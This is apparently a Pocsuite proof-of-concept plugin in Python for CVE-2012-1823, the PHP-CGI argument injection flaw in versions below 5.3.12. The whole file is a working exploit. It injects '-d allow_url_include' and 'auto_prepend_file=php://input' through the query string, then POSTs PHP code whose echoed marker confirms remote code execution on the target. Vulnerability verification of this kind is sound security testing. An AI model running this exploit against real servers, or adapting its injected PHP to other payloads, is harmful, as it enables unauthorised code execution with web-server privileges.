#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import time
import random
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register



class TestPOC(POCBase):
    name = 'php_cgl_code_execution'
    vulID = '0'
    author = ['LRestless']
    vulType = '	code-exec'
    version = '1'
    references = ['https://vulhub.org/#/environments/php/CVE-2012-1823/']
    desc = u'''在PHP中使用基于cgi的设置(如Apache的mod_cgid),在某些配置可以执行任意代码与Web服务器的权限'''

    vulDate = '2012'
    createDate = '2019-03-22'
    updateDate = '2019-03-22'

    appName = 'PHP CGL'
    appVersion = '<5.3.12'
    appPowerLink = 'http://www.php.net/'
    samples = ['']

    def _attack(self):
        """attack mode"""
        return self._verify()
        pass

    def _verify(self):
        """verify  mode"""
        result = {}
        header = {
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        payload = '/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input'
        flag = "".join(random.choice(string.ascii_letters) for _ in xrange(0, 8))
        data = '<?php echo "' + flag + '"; ?>'
        self.url = self.url.strip('/') + payload
        resp = req.post(self.url, headers=header, data=data)
        time.sleep(2)
        if flag in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

